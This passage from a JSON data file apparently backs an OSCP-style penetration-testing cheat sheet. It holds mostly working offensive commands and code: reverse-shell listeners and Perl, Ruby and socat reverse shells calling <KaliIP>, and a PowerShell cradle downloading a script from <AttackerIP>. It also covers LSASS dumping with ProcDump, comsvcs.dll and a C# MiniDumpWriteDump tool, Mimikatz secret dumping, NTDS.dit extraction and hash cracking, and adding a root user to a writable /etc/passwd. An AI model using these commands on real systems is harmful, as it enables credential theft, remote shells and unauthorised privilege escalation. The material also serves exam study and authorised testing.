            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Complete User Setup",
            "codes": [
              {
                "lang": "bash",
                "code": "# Create user with home directory and bash shell\nsudo useradd -m -s /bin/bash hacker\n\n# Set password\nsudo passwd hacker\n# Enter password when prompted"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Adding User to sudo Group",
        "codes": [
          {
            "lang": "bash",
            "code": "# Debian/Ubuntu\nsudo usermod -aG sudo <username>\n\n# RHEL/CentOS\nsudo usermod -aG wheel <username>"
          },
          {
            "lang": "bash",
            "code": "# Example\nsudo usermod -aG sudo hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Adding User with Specific UID/GID",
        "codes": [
          {
            "lang": "bash",
            "code": "useradd -u <UID> -g <group> <username>"
          },
          {
            "lang": "bash",
            "code": "# Example - Create user with UID 1500\nsudo useradd -u 1500 -m -s /bin/bash hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Viewing Users",
        "codes": [
          {
            "lang": "bash",
            "code": "# List all users\ncat /etc/passwd\n\n# List only usernames\ncat /etc/passwd | cut -d: -f1\n\n# View specific user\nid <username>\n\n# View groups for user\ngroups <username>\n\n# List sudo users (Debian/Ubuntu)\ngetent group sudo\n\n# List wheel users (RHEL/CentOS)\ngetent group wheel"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Modifying Users",
        "codes": [
          {
            "lang": "bash",
            "code": "# Change password\nsudo passwd <username>\n\n# Change shell\nsudo usermod -s /bin/bash <username>\n\n# Add to group\nsudo usermod -aG <group> <username>\n\n# Change home directory\nsudo usermod -d /new/home <username>\n\n# Lock user account\nsudo usermod -L <username>\n\n# Unlock user account\nsudo usermod -U <username>\n\n# Delete user\nsudo userdel <username>\n\n# Delete user and home directory\nsudo userdel -r <username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Reverse Shells",
    "title": "Listeners",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Netcat Listener",
        "codes": [
          {
            "lang": "bash",
            "code": "nc -nvlp <Port>"
          },
          {
            "lang": "bash",
            "code": "rlwrap nc -lvnp <Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Ncat with SSL",
        "codes": [
          {
            "lang": "bash",
            "code": "ncat --ssl -nvlp <Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Socat Listener",
        "codes": [
          {
            "lang": "bash",
            "code": "socat TCP-LISTEN:<Port> -"
          },
          {
            "lang": "bash",
            "code": "socat file:`tty`,raw,echo=0 tcp-listen:<Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Metasploit Handler",
        "codes": [
          {
            "lang": "bash",
            "code": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run\""
          },
          {
            "lang": "bash",
            "code": "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Pivoting",
    "title": "Local Port Forwarding",
    "tags": [],
    "steps": [
      {
        "title": "Forward Remote Port to Local",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh <Username>@<TargetIP> -L <LocalPort>:<DestinationHost>:<DestinationPort>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example: Forward Remote RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh user@10.10.10.5 -L 3389:192.168.1.100:3389"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Now you can connect to `localhost:3389` and it will forward to `192.168.1.100:3389` through the SSH tunnel.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Access Forwarded Port",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp3 /u:<Username> /p:'<Password>' /v:localhost:3389"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Multiple Port Forwards",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh user@10.10.10.5 -L 3389:192.168.1.100:3389 -L 445:192.168.1.100:445 -L 5985:192.168.1.100:5985"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Mimikatz",
    "title": "LSA Secrets Dumping",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump LSA Secrets",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # lsadump::secrets"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "LSA secrets contain:\n- Service account passwords\n- Auto-logon credentials\n- VPN credentials\n- Scheduled task passwords",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Dump Cached Domain Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # lsadump::cache"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Cached credentials allow domain users to log in when DC is unavailable.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Machine Compromise Order",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "Recommended Approach",
        "codes": [
          {
            "lang": "bash",
            "code": "# Quick nmap scan of all targets\nnmap -p- -T4 192.168.1.10 -oA nmap/machine1 &\nnmap -p- -T4 192.168.1.11 -oA nmap/machine2 &\nnmap -p- -T4 192.168.1.12 -oA nmap/machine3 &"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Step 1: Enumerate All Machines (30 minutes)**"
          }
        ],
        "postNotes": [
          {
            "type": "text",
            "content": "**Step 2: Identify Easiest Target (15 minutes)**\n- Review nmap results\n- Look for obvious vulnerabilities\n- Check for known exploits\n- Identify low-hanging fruit"
          },
          {
            "type": "text",
            "content": "**Step 3: Fully Compromise First Machine (2-4 hours)**\n- Get initial foothold\n- Escalate to user\n- Escalate to root/SYSTEM\n- Capture proof.txt and local.txt\n- Document everything"
          },
          {
            "type": "text",
            "content": "**Step 4: Repeat for Remaining Machines**\n- Move to next easiest target\n- Complete 100% before switching\n- Document as you go"
          },
          {
            "type": "text",
            "content": "**Step 5: AD Set (If Needed)**\n- Only attempt if you need more points\n- Can skip if you have 70+ points already"
          },
          {
            "type": "note",
            "content": "Don't start AD set until you've rooted at least 2 standalone machines.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Manual Header Inspection",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Using curl",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -I https://example.com"
          },
          {
            "lang": "text",
            "code": "HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: text/html\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=31536000\nX-Content-Type-Options: nosniff"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using curl with Specific Headers",
        "codes": [
          {
            "lang": "bash",
            "code": "curl -I -H \"User-Agent: Mozilla/5.0\" https://example.com"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check Multiple URLs",
        "codes": [
          {
            "lang": "bash",
            "code": "for url in $(cat urls.txt); do\n  echo \"=== $url ===\"\n  curl -I \"$url\" | grep -E \"(X-Frame|Content-Security|Strict-Transport|X-Content-Type|X-XSS)\"\ndone"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Manual Shadow Copy Workflow",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 1: Create Shadow Copy",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin create shadow /for=C:"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Identify Shadow Copy Path",
        "codes": [
          {
            "lang": "powershell",
            "code": "vssadmin list shadows"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "text",
            "content": "**Note the DeviceObject path:** `\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2`"
          }
        ]
      },
      {
        "title": "Step 3: Copy NTDS.dit and SYSTEM",
        "codes": [
          {
            "lang": "powershell",
            "code": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Transfer Files to Kali",
        "codes": [
          {
            "lang": "powershell",
            "code": "# On Windows (start SMB server on Kali first)\ncopy C:\\Temp\\ntds.dit \\\\<KaliIP>\\share\\ntds.dit\ncopy C:\\Temp\\SYSTEM \\\\<KaliIP>\\share\\SYSTEM"
          },
          {
            "lang": "bash",
            "code": "# On Kali (start SMB server)\nimpacket-smbserver share . -smb2support"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Extract Hashes on Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Crack Hashes",
        "codes": [
          {
            "lang": "bash",
            "code": "# Extract NTLM hashes only\ncat domain_hashes.txt | cut -d: -f4 > ntlm_hashes.txt\n\n# Crack with Hashcat\nhashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Offline Credential Processing",
    "title": "Memory Dump Techniques",
    "tags": [
      "Credential_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "Task Manager Dump",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Requires GUI access and admin privileges:\n1. Open Task Manager\n2. Find lsass.exe in Details tab\n3. Right-click, Create dump file\n4. Dump saved to %TEMP%\\lsass.DMP",
            "variant": "info"
          }
        ]
      },
      {
        "title": "ProcDump",
        "codes": [
          {
            "lang": "bash",
            "code": "procdump.exe -ma lsass.exe lsass.dmp"
          },
          {
            "lang": "bash",
            "code": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "comsvcs.dll MiniDump",
        "substeps": [
          {
            "title": "Get LSASS PID",
            "codes": [
              {
                "lang": "bash",
                "code": "tasklist /fi \"imagename eq lsass.exe\""
              },
              {
                "lang": "powershell",
                "code": "(Get-Process lsass).Id"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full"
          }
        ]
      },
      {
        "title": "PowerShell MiniDump",
        "codes": [
          {
            "lang": "powershell",
            "code": "$proc = Get-Process lsass\n$path = \"C:\\Windows\\Temp\\lsass.dmp\"\n[System.Diagnostics.ProcessDumpHelper]::GetProcessDump($proc.Id, $path)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Out-Minidump (PowerSploit)",
        "codes": [
          {
            "lang": "powershell",
            "code": "IEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/Out-Minidump.ps1')\nGet-Process lsass | Out-Minidump -DumpFilePath C:\\Windows\\Temp\\"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "MITRE - OS Credential Dumping",
        "url": "https://attack.mitre.org/techniques/T1003/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Dump LSASS process memory for offline credential extraction. Avoids real-time AV detection of **Mimikatz**.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Mental Preparation",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "Exam Day Mindset",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Before Exam:**\n- Get good sleep (8 hours)\n- Eat healthy breakfast\n- Set up workspace\n- Test VPN connection\n- Have snacks and water ready"
          },
          {
            "type": "text",
            "content": "**During Exam:**\n- Stay calm and methodical\n- Trust your methodology\n- Don't panic if stuck\n- Remember: you've done this in labs"
          },
          {
            "type": "text",
            "content": "**If Failing:**\n- You can retake the exam\n- Learn from mistakes\n- Review weak areas\n- Practice more on Proving Grounds"
          },
          {
            "type": "note",
            "content": "OSCP is about methodology, not memorization. Follow your process.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 10: Vi/Vim",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Open vim\nvim"
      },
      {
        "type": "text",
        "content": "# In vim, type:\n:set shell=/bin/bash\n:shell\n```"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Method 1: Add New Root User",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Generate Password Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd <password>"
          },
          {
            "lang": "bash",
            "code": "# Example\nopenssl passwd Password123\n# Output: $1$xyz$abc123..."
          },
          {
            "lang": "bash",
            "code": "# With salt\nopenssl passwd -1 -salt xyz Password123\n# Output: $1$xyz$abc123..."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Add User to /etc/passwd",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'hacker:$1$xyz$abc123...:0:0:root:/root:/bin/bash' >> /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "UID 0 and GID 0 make this user equivalent to root!",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Step 3: Switch to New User",
        "codes": [
          {
            "lang": "bash",
            "code": "su hacker\n# Password: Password123"
          },
          {
            "lang": "bash",
            "code": "# Verify root access\nwhoami\n# Output: root\n\nid\n# Output: uid=0(root) gid=0(root) groups=0(root)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 1: Python PTY (Most Common)",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Spawn PTY Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
          },
          {
            "lang": "bash",
            "code": "# Python 3\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Background the Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "# Press Ctrl+Z to background\n^Z"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Configure Local Terminal",
        "codes": [
          {
            "lang": "bash",
            "code": "stty raw -echo; fg"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "After pressing Enter, the shell will return but you won't see your typing. This is normal!",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Step 4: Reset Terminal",
        "codes": [
          {
            "lang": "bash",
            "code": "reset"
          },
          {
            "lang": "bash",
            "code": "# Or specify terminal type\nexport TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Set Terminal Size (Optional)",
        "codes": [
          {
            "lang": "bash",
            "code": "# On your Kali machine, check size\nstty size\n# Output: 24 80\n\n# On target, set the same size\nstty rows 24 columns 80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Complete Workflow",
        "codes": [
          {
            "lang": "bash",
            "code": "# 1. Spawn PTY\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# 2. Background (Ctrl+Z)\n^Z\n\n# 3. Configure terminal\nstty raw -echo; fg\n\n# 4. Reset and configure\nreset\nexport TERM=xterm\nexport SHELL=bash\n\n# 5. Set size (optional)\nstty rows 24 columns 80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Writable etc-passwd",
    "title": "Method 2: Modify Existing User",
    "tags": [],
    "steps": [
      {
        "title": "Change User's UID to 0",
        "codes": [
          {
            "lang": "bash",
            "code": "# Find your current user in /etc/passwd\ngrep $USER /etc/passwd\n\n# Change UID and GID to 0\nsed -i 's/^<username>:x:[0-9]*:[0-9]*:/<username>:x:0:0:/' /etc/passwd"
          },
          {
            "lang": "bash",
            "code": "# Example for user 'john'\nsed -i 's/^john:x:[0-9]*:[0-9]*:/john:x:0:0:/' /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Verify Changes",
        "codes": [
          {
            "lang": "bash",
            "code": "# Logout and login again\nexit\nsu john\n\n# Check privileges\nid\n# Output: uid=0(root) gid=0(root)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 2: Script Command",
    "tags": [],
    "steps": [
      {
        "title": "Using script",
        "codes": [
          {
            "lang": "bash",
            "code": "script /dev/null -c bash"
          },
          {
            "lang": "bash",
            "code": "# Alternative\n/usr/bin/script -qc /bin/bash /dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Then Stabilize",
        "codes": [
          {
            "lang": "bash",
            "code": "# Background with Ctrl+Z\n^Z\n\n# Configure\nstty raw -echo; fg\n\n# Reset\nreset\nexport TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Writable etc-passwd",
    "title": "Method 3: Remove Password Requirement",
    "tags": [],
    "steps": [
      {
        "title": "Remove Password Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "# Change from:\n# user:x:1000:1000:...\n# To:\n# user::1000:1000:..."
          },
          {
            "lang": "bash",
            "code": "# Remove password requirement\nsed -i 's/^<username>:x:/<username>::/' /etc/passwd"
          },
          {
            "lang": "bash",
            "code": "# Now switch to user without password\nsu <username>\n# No password required!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 3: Socat (Best Method)",
    "tags": [],
    "steps": [
      {
        "title": "If Socat is on Target",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - Listener\nsocat file:`tty`,raw,echo=0 tcp-listen:4444"
          },
          {
            "lang": "bash",
            "code": "# On Target - Connect back\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KaliIP>:4444"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "If Socat is NOT on Target",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - Start HTTP server\npython3 -m http.server 80\n\n# On Target - Download socat\nwget http://<KaliIP>/socat -O /tmp/socat\nchmod +x /tmp/socat\n\n# On Kali - Listener\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n# On Target - Connect\n/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<KaliIP>:4444"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Socat provides the most stable shell but requires socat on the target.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 4: Perl",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\nperl -e 'exec \"/bin/bash\";'\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Alternative\nperl -e 'use Socket;$i=\"<KaliIP>\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 5: Expect",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Create expect script\ncat > /tmp/shell.exp << 'EOF'\n#!/usr/bin/expect\nspawn bash\ninteract\nEOF"
      },
      {
        "type": "text",
        "content": "chmod +x /tmp/shell.exp\n/tmp/shell.exp\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 6: Ruby",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\nruby -e 'exec \"/bin/bash\"'\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Alternative\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"<KaliIP>\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 7: Lua",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\nlua -e \"os.execute('/bin/bash')\"\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 8: AWK",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\nawk 'BEGIN {system(\"/bin/bash\")}'\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Method 9: Find Command",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\nfind / -name blah -exec /bin/bash \\;\n```"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Mimikatz",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "Mimikatz GitHub",
        "url": "https://github.com/gentilkiwi/mimikatz"
      },
      {
        "text": "ADSecurity Mimikatz Guide",
        "url": "https://adsecurity.org/?page_id=1821"
      },
      {
        "text": "HackTricks Mimikatz",
        "url": "https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Comprehensive guide to Mimikatz - the ultimate Windows credential extraction and manipulation tool."
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Mimikatz Modules Reference",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "privilege Module",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `privilege::debug` - Enable SeDebugPrivilege (required for most operations)"
          }
        ]
      },
      {
        "title": "sekurlsa Module (LSASS Manipulation)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `sekurlsa::logonpasswords` - Dump all credentials from LSASS\n- `sekurlsa::tickets` - List Kerberos tickets\n- `sekurlsa::tickets /export` - Export tickets to files\n- `sekurlsa::ekeys` - Dump Kerberos encryption keys\n- `sekurlsa::dpapi` - Dump DPAPI master keys\n- `sekurlsa::wdigest` - Dump WDigest credentials\n- `sekurlsa::minidump <file>` - Load LSASS dump file\n- `sekurlsa::pth` - Pass-the-hash attack"
          }
        ]
      },
      {
        "title": "lsadump Module (LSA/SAM Dumping)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `lsadump::sam` - Dump SAM database\n- `lsadump::secrets` - Dump LSA secrets\n- `lsadump::cache` - Dump cached domain credentials\n- `lsadump::dcsync` - DCSync attack (replicate DC data)\n- `lsadump::trust` - Dump trust keys"
          }
        ]
      },
      {
        "title": "kerberos Module (Kerberos Attacks)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `kerberos::list` - List cached Kerberos tickets\n- `kerberos::ptt <ticket>` - Pass-the-ticket\n- `kerberos::golden` - Create golden/silver tickets\n- `kerberos::purge` - Clear all tickets"
          }
        ]
      },
      {
        "title": "token Module (Token Manipulation)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `token::elevate` - Elevate to SYSTEM\n- `token::list` - List available tokens\n- `token::revert` - Revert to original token"
          }
        ]
      },
      {
        "title": "vault Module (Windows Vault)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `vault::cred` - Dump Windows Vault credentials\n- `vault::list` - List vault items"
          }
        ]
      },
      {
        "title": "misc Module (Miscellaneous)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `misc::skeleton` - Inject skeleton key into DC"
          }
        ]
      },
      {
        "title": "ts Module (Terminal Services)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `ts::mstsc` - Dump RDP credentials\n- `ts::sessions` - List TS sessions"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Offline Credential Processing",
    "title": "MiniDumpWriteDump API",
    "tags": [
      "Credential_Access",
      "Windows"
    ],
    "steps": [
      {
        "title": "C# Memory Dumper",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\nusing System.Diagnostics;\nusing System.IO;\n\nclass Dumper\n{\n    [DllImport(\"dbghelp.dll\")]\n    static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n\n    static void Main()\n    {\n        Process proc = Process.GetProcessesByName(\"lsass\")[0];\n        IntPtr hProcess = OpenProcess(0x001F0FFF, false, proc.Id);\n\n        using (FileStream fs = new FileStream(@\"C:\\Windows\\Temp\\lsass.dmp\", FileMode.Create))\n        {\n            // MiniDumpWithFullMemory = 0x00000002\n            MiniDumpWriteDump(hProcess, proc.Id, fs.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n        }\n    }\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shared Library Attacks",
    "title": "Missing Library Hijacking",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Find Missing Libraries",
        "codes": [
          {
            "lang": "bash",
            "code": "ldd /path/to/binary 2>&1 | grep \"not found\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check for Writable Library Paths",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -writable -type d 2>/dev/null | grep -E \"(lib|lib64)\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check ld.so.conf",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/ld.so.conf\ncat /etc/ld.so.conf.d/*"
          }
        ],
        "optional": false,
